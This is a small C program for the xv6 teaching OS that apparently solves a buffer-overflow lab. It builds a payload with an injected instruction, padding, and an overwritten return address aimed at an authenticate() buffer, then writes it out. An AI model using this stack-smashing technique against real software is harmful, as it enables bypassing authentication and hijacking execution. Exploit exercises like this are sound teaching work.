#include "kernel/types.h"
#include "user/user.h"

int main()
{
    char payload[64];

    // injected instruction 0000006F
    payload[0] = 0x6F;
    payload[1] = 0x00;
    payload[2] = 0x00;
    payload[3] = 0x00;

    // 52 zeros to reach return address
    for (int i = 4; i < 56; i++) {
        payload[i] = 0x00;
    }

    // overwrite return address (inject stack address)
    // authenticate() buffer at user virtual address 0x4F80
    payload[56] = 0x80;
    payload[57] = 0x4F;
    payload[58] = 0x00;
    payload[59] = 0x00;
    payload[60] = 0x00;
    payload[61] = 0x00;
    payload[62] = 0x00;
    payload[63] = 0x00;

    write(1, payload, sizeof(payload));

    exit(0);
}